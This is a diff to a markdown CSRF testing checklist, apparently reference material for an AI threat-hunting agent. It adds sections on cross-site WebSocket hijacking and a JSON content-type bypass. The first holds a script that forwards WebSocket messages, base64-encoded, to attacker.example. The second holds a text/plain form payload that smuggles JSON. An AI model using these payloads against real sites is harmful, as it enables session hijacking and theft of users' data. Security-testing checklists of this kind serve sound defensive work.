@@ -84,6 +84,25 @@ origin: AI Threat Hunting
 - [ ] CSRF + login = login CSRF (force victim into attacker's account)
 - [ ] CSRF + CORS misconfiguration
 
+### 8. Cross-Site WebSocket Hijacking (CSWSH)
+
+- [ ] If target uses WebSocket with cookie-based auth, test cross-origin WebSocket connect:
+      ```html
+      <script>var ws = new WebSocket('wss://target.example/ws'); ws.onmessage = function(e) { fetch('https://attacker.example/log?d='+btoa(e.data)); };</script>
+      ```
+- [ ] Check if `Origin` header is validated on WebSocket upgrade request
+- [ ] Check if CSRF token is required in the WebSocket handshake
+
+### 9. JSON Content-Type Bypass
+
+- [ ] Bypass preflight for JSON APIs using `enctype="text/plain"` with form:
+      ```html
+      <form action="https://target/api/action" method="POST" enctype="text/plain">
+        <input name='{"key":"value","x":"' value='"}' type="hidden">
+      </form>
+      ```
+- [ ] Server must accept `text/plain` Content-Type for this to work
+
 ## What to Record
 
 - Endpoint and action vulnerable to CSRF
@@ -96,4 +115,3 @@ origin: AI Threat Hunting
 ## Extended Resources
 
 - `agent/references/payloads/csrf-payloads.md` — auto-submit forms, JSON CSRF, token bypass techniques
-- `agent/references/vuln-checklists/A01-broken-access-control.md` — OWASP Top 10:2025 access control checklist
